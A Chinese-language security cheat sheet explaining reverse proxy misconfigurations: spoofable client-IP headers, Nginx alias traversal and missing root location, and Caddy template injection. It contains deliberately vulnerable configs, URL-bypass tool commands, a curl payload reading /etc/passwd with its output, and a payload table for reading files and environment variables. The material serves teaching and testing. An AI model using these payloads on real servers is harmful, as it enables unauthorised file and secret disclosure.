[原文文档](README.en.md)

# 反向代理配置错误

> 反向代理是位于客户端和后端服务器之间的服务器，它将客户端请求转发到适当的服务器，同时隐藏后端基础设施，通常还提供负载均衡或缓存。反向代理中的配置错误，如不当的访问控制、proxy_pass 指令中缺少输入清理，或信任客户端提供的头部（如 X-Forwarded-For），可能导致漏洞，如未授权访问、目录遍历或内部资源暴露。

## 摘要

* [工具](#工具)
* [方法论](#方法论)
    * [HTTP 头部](#http-头部)
        * [X-Forwarded-For](#x-forwarded-for)
        * [X-Real-IP](#x-real-ip)
        * [True-Client-IP](#true-client-ip)
    * [Nginx](#nginx)
        * [Off By Slash](#off-by-slash)
        * [Missing Root Location](#missing-root-location)
    * [Caddy](#caddy)
        * [Template Injection](#template-injection)
* [实验环境](#实验环境)
* [参考资料](#参考资料)

## 工具

* [yandex/gixy](https://github.com/yandex/gixy) - Nginx 配置静态分析器。
* [shiblisec/Kyubi](https://github.com/shiblisec/Kyubi) - 用于发现 Nginx 别名遍历配置错误的工具。
* [laluka/bypass-url-parser](https://github.com/laluka/bypass-url-parser) - 测试多种 URL 绕过以访问受 40X 保护的页面的工具。

    ```ps1
    bypass-url-parser -u "http://127.0.0.1/juicy_403_endpoint/" -s 8.8.8.8 -d
    bypass-url-parser -u /path/urls -t 30 -T 5 -H "Cookie: me_iz=admin" -H "User-agent: test"
    bypass-url-parser -R /path/request_file --request-tls -m "mid_paths, end_paths"
    ```

## 方法论

### HTTP 头部

由于像 `X-Forwarded-For`、`X-Real-IP` 和 `True-Client-IP` 这样的头部只是常规的 HTTP 头部，如果客户端能够控制流量路径的一部分，它就可以设置或覆盖这些头部——特别是在直接连接到应用程序服务器时，或者当反向代理没有正确过滤或验证这些头部时。

#### X-Forwarded-For

`X-Forwarded-For` 是一个 HTTP 头部，用于识别通过 HTTP 代理或负载均衡器连接到 Web 服务器的客户端的原始 IP 地址。

当客户端通过代理或负载均衡器发出请求时，该代理添加一个包含客户端真实 IP 地址的 X-Forwarded-For 头部。

如果存在多个代理（请求通过多个代理），每个代理都会将其接收请求的地址添加到头部，用逗号分隔。

```ps1
X-Forwarded-For: 2.21.213.225, 104.16.148.244, 184.25.37.3
```

Nginx 可以用客户端的真实 IP 地址覆盖头部。

```ps1
proxy_set_header X-Forwarded-For $remote_addr;
```

#### X-Real-IP

`X-Real-IP` 是另一个自定义 HTTP 头部，通常由 Nginx 和其他一些代理使用，用于转发原始客户端 IP 地址。与包含 IP 地址链的 X-Forwarded-For 不同，X-Real-IP 只包含一个 IP：连接到第一个代理的客户端的地址。

#### True-Client-IP

`True-Client-IP` 是由某些提供商（特别是 Akamai）开发和标准化的头部，用于通过其基础设施传递原始客户端的 IP 地址。

### Nginx

#### Off By Slash

Nginx 将传入的请求 URI 与配置中定义的位置块匹配。

* `location /app/` 匹配对 `/app/`、`/app/foo`、`/app/bar/123` 等的请求。
* `location /app`（没有尾随斜杠）匹配 `/app*`（即 `/application`、`/appfile` 等），

这意味着在 Nginx 中，位置块中斜杠的存在或缺失会改变匹配逻辑。

```ps1
server {
  location /app/ {
    # 处理 /app/ 和下面的任何内容，例如 /app/foo
  }
  location /app {
    # 只处理 /app 后面没有内容的 OR 路由，如 /application、/appzzz
  }
}
```

易受攻击的配置示例：攻击者请求 `/styles../secret.txt` 解析为 `/path/styles/../secret.txt`

```ps1
location /styles {
  alias /path/css/;
}
```

#### Missing Root Location

`root /etc/nginx;` 指令为静态文件设置服务器的根目录。
配置没有根位置 `/`，它将被全局设置。
对 `/nginx.conf` 的请求将解析为 `/etc/nginx/nginx.conf`。

```ps1
server {
  root /etc/nginx;

  location /hello.txt {
    try_files $uri $uri/ =404;
    proxy_pass http://127.0.0.1:8080/;
  }
}
```

### Caddy

#### Template Injection

提供的 Caddy Web 服务器配置使用 `templates` 指令，允许使用 Go 模板进行动态内容渲染。

```ps1
:80 {
    root * /
    templates
    respond "You came from {http.request.header.Referer}"
}
```

这告诉 Caddy 将响应字符串作为模板处理，并插值引用请求头部中存在的任何变量（使用 Go 模板语法）。

在这个 curl 请求中，攻击者在 `Referer` 头部中提供了 Go 模板表达式：`{{readFile "etc/passwd"}}`。

```ps1
curl -H 'Referer: {{readFile "etc/passwd"}}' http://localhost/
```

```ps1
HTTP/1.1 200 OK
Content-Length: 716
Content-Type: text/plain; charset=utf-8
Server: Caddy
Date: Thu, 24 Jul 2025 08:00:50 GMT

You came from root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
```

由于 Caddy 运行 templates 指令，它将评估上下文内大括号中的任何内容，包括来自不可信输入的内容。`readFile` 函数在 Caddy 模板中可用，因此攻击者的输入导致 Caddy 实际读取 `/etc/passwd` 并将其内容插入 HTTP 响应中。

| Payload                       | 描述 |
| ----------------------------- | ----------- |
| `{{env "VAR_NAME"}}`          | 获取环境变量   |
| `{{listFiles "/"}}`           | 列出目录中的所有文件 |
| `{{readFile "path/to/file"}}` | 读取文件 |

## 实验环境

* [Root Me - Nginx - Alias Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Alias-Misconfiguration)
* [Root Me - Nginx - Root Location Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Root-Location-Misconfiguration)
* [Root Me - Nginx - SSRF Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-SSRF-Misconfiguration)
* [Detectify - Vulnerable Nginx](https://github.com/detectify/vulnerable-nginx)

## 参考资料

* [What is X-Forwarded-For and when can you trust it? - Phil Sturgeonopens - January 31, 2024](https://httptoolkit.com/blog/what-is-x-forwarded-for/)
* [Common Nginx misconfigurations that leave your web server open to attack - Detectify - November 10, 2020](https://blog.detectify.com/industry-insights/common-nginx-misconfigurations-that-leave-your-web-server-ope-to-attack/)